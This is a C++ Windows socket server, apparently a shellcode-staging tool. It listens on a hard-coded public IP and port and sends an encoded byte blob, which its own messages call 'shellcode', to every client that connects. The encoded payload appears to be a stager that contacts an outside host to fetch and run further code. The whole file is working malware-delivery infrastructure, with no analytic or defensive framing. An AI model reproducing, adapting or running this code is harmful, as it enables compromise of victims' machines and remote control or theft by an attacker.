#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib")
using namespace std;


int main(int argc, char* argv[])
{
	const int BUF_SIZE = 1024;
	WSADATA         wsd;            //WSADATA变量
	SOCKET          sServer;        //服务器套接字
	SOCKET          sClient;        //客户端套接字
	SOCKADDR_IN     addrServ;;      //服务器地址
	char            buf[BUF_SIZE];  //接收数据缓冲区
	char			sendBuf[] = "\xfb\xef\x8e\x07\x07\x07\x67\x8e\xe2\x36\xd5\x63\x8c\x55\x37\x8c\x55\x0b\x8c\x55\x13\x8c\x75\x2f\x08\xb0\x4d\x21\x36\xf8\x36\xc7\xab\x3b\x66\x7b\x05\x2b\x27\xc6\xc8\x0a\x06\xc0\xe5\xf7\x55\x50\x8c\x55\x17\x8c\x45\x3b\x06\xd7\x8c\x47\x7f\x82\xc7\x73\x4d\x06\xd7\x57\x8c\x4f\x1f\x8c\x5f\x27\x06\xd4\xe4\x3b\x4e\x8c\x33\x8c\x06\xd1\x36\xf8\x36\xc7\xab\xc6\xc8\x0a\x06\xc0\x3f\xe7\x72\xf3\x04\x7a\xff\x3c\x7a\x23\x72\xe5\x5f\x8c\x5f\x23\x06\xd4\x61\x8c\x0b\x4c\x8c\x5f\x1b\x06\xd4\x8c\x03\x8c\x06\xd7\x8e\x43\x23\x23\x5c\x5c\x66\x5e\x5d\x56\xf8\xe7\x5f\x58\x5d\x8c\x15\xec\x81\x5a\x6f\x69\x62\x73\x07\x6f\x70\x6e\x69\x6e\x53\x6f\x4b\x70\x21\x00\xf8\xd2\xef\x07\x07\x07\x07\x36\xf8\x50\x50\x50\x50\x50\x6f\x3d\x51\x7e\xa0\xf8\xd2\xee\xa3\x07\x07\x07\x5c\x36\xce\x56\x56\x6d\x04\x56\x56\x6f\xbc\x06\x07\x07\x54\x57\x6f\x50\x8e\x98\xc1\xf8\xd2\x57\xee\x8b\x07\x07\x07\x5c\x36\xd5\x55\x6f\x07\x35\xc7\x83\x55\x55\x55\x54\x55\x57\x6f\xec\x52\x29\x3c\xf8\xd2\x8e\xc1\x84\xc4\x57\x6f\x87\x34\x07\x07\x8e\xe7\x6d\x03\x57\x6d\x18\x51\x6f\x72\x41\x99\x81\xf8\xd2\x58\x36\xf8\x50\x50\x6d\xf8\x54\x51\x6f\x2a\x01\x1f\x7c\xf8\xd2\x82\xc7\x08\x83\xcd\x06\x07\x07\x36\xf8\x82\xf1\x73\x03\x8e\xfe\xec\x0e\x6f\xad\xc2\xe5\x5a\xf8\xd2\x8e\xc6\x6f\x42\x26\x59\x36\xf8\xd2\x36\xf8\x50\x6d\x00\x56\x51\x57\x6f\xb0\x50\xe7\x0c\xf8\xd2\xb8\x07\x28\x07\x07\x3e\xc0\x72\x00\x5f\x57\xee\x7c\xf8\xf8\xf8\x36\xf8\xee\x96\x06\x07\x07\xee\xce\x06\x07\x07\xef\x68\xf8\xf8\xf8\x28\x66\x77\x6e\x28\x71\x36\x28\x40\x62\x73\x4b\x6e\x64\x62\x69\x64\x62\x38\x72\x72\x6e\x63\x3a\x3e\x31\x64\x32\x61\x36\x62\x36\x2a\x37\x31\x30\x65\x2a\x33\x3e\x35\x62\x2a\x66\x34\x3f\x65\x2a\x33\x61\x31\x35\x3e\x37\x34\x31\x3e\x36\x35\x36\x07\x40\x47\xaf\x7e\x69\x22\x56\xaf\xb2\x2a\xcc\xa4\x44\x2b\xed\xbc\xdc\x3f\x07\x52\x74\x62\x75\x2a\x46\x60\x62\x69\x73\x3d\x27\x4a\x68\x7d\x6e\x6b\x6b\x66\x28\x32\x29\x37\x27\x2f\x50\x6e\x69\x63\x68\x70\x74\x27\x49\x53\x27\x36\x37\x29\x37\x3c\x27\x50\x48\x50\x31\x33\x3c\x27\x53\x75\x6e\x63\x62\x69\x73\x28\x30\x29\x37\x3c\x27\x75\x71\x3d\x36\x36\x29\x37\x2e\x27\x6b\x6e\x6c\x62\x27\x40\x62\x64\x6c\x68\x0a\x0d\x07\xb8\x65\x8f\x86\xd1\xf6\x0c\x1d\x78\x9d\x7e\x56\x2d\xce\xbd\x04\x63\xa5\xe7\x50\x9c\xbe\x6c\x17\x7b\xb4\x27\x0c\x3c\xce\x23\xdb\x79\xca\x60\x83\x09\x3d\xe8\x01\x54\x32\x69\x01\x99\xad\x6f\x7c\x4f\xb6\xf7\x09\x4f\x6a\xfb\xb7\x56\x2d\xd6\xa1\xb7\xb7\xd4\xd2\xca\xa9\x81\x8e\x1a\x5d\xad\x67\xe7\x1a\x8e\x98\x19\x43\xe0\x90\x09\x5c\x12\x7e\x65\xbe\xd2\x35\x5b\x8c\xb8\x01\x4a\x33\xb6\x9c\x7f\x79\xef\xea\x37\x96\x34\xe2\x52\x5a\x08\x5b\x0b\x72\x25\xd2\x21\x4c\x2f\xc7\x6f\x0b\x75\xc3\x8b\x7c\x2a\x2b\xdf\x82\x7f\x67\x98\x45\xaa\xbd\x0a\xd8\x06\x21\x29\xd4\xb4\x5c\xd1\x0a\xf3\xfb\x42\xf6\x3b\x2b\x52\xed\x3a\xbd\x51\x3c\x8c\x1c\x06\x2f\x2c\x9a\x8f\xc1\x37\x2c\xcc\x89\x0c\x62\xa6\x47\x20\xd7\x66\x56\x6d\xeb\xa1\xce\xd9\x90\xbb\x25\x29\x93\x25\x9b\x60\xa7\x2c\xf4\x43\x37\xe8\x4b\x8c\xed\x58\xd1\x2a\x1c\xa5\x00\xfd\x3c\xc3\xe2\xf3\xcb\xf9\x2c\xe6\xba\x51\x24\xf1\xb8\x6a\x61\xe3\x07\x6f\xf7\xb2\xa5\x51\xf8\xd2\x6d\x47\x6f\x07\x17\x07\x07\x6f\x07\x07\x47\x07\x50\x6f\x5f\xa3\x54\xe2\xf8\xd2\x94\xbe\x0d\x07\x07\x07\x06\xde\x56\x54\x8e\xe0\x50\x6f\x07\x27\x07\x07\x54\x51\x6f\x15\x91\x8e\xe5\xf8\xd2\x82\xc7\x73\xc1\x8c\x00\x06\xc4\x82\xc7\x72\xe2\x5f\xc4\xef\x8e\xfa\xf8\xf8\x70\x70\x70\x29\x76\x6e\x69\x60\x74\x6f\x72\x6e\x7e\x72\x69\x29\x71\x6e\x77\x07\x07\x07\x07\x06";
	int             retVal;         //返回值
	

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		cout << "WSAStartup failed!" << endl;
		return 1;
	}

	
	sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == sServer)

	{
		cout << "Socket Failed!" << endl;
		WSACleanup();
		return  -1;
	}

	
	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.s_addr = inet_addr("47.243.95.0");
	addrServ.sin_port = htons((short)atoi("9000"));	
	//addrServ.sin_addr.s_addr = htonl(INADDR_ANY);

	
	retVal = bind(sServer, (LPSOCKADDR)&addrServ, sizeof(SOCKADDR_IN));
	if (SOCKET_ERROR == retVal)
	{
		cout << "Bind Failed!" << endl;
		closesocket(sServer);  
		WSACleanup();         
		return -1;
	}


	retVal = listen(sServer, 10);
	if (SOCKET_ERROR == retVal)
	{
		cout << "Listen Failed!" << endl;
		closesocket(sServer);  

		WSACleanup();          
		return -1;
	}

	cout << "开始监听中...." << endl;
	sockaddr_in addrClient;					// sockaddr_in结构体，（客户端的IP，PORT）
	int addrClientlen = sizeof(addrClient); // 结构体变量的长度
	int flag = 1;


	while (1)
	{
		sClient = accept(sServer, (sockaddr FAR*) & addrClient, &addrClientlen);
		if (INVALID_SOCKET == sClient)
		{
			cout << "Accept Failed!" << endl;
			closesocket(sServer);
			WSACleanup();
			return -1;
		}

		
		ZeroMemory(buf, BUF_SIZE);

		retVal = recv(sClient, buf, BUF_SIZE, 0);

		if (SOCKET_ERROR == retVal) 
		{
			cout << "Recv Failed!" << endl;
			closesocket(sServer);  
			closesocket(sClient);      
			WSACleanup();         
			return -1;
		}

		/*if (buf[0] == '0')
			break;*/

		cout << "成功建立通信" << endl;
		send(sClient, sendBuf, sizeof(sendBuf), 0);
		cout << "向客户端发送shellcode..." << endl;
		cout << "发送shellcode成功!" << endl;
		//flag = 0;

	}


	closesocket(sServer);  
	//closesocket(sClient);  
	WSACleanup();           

	return 0;
}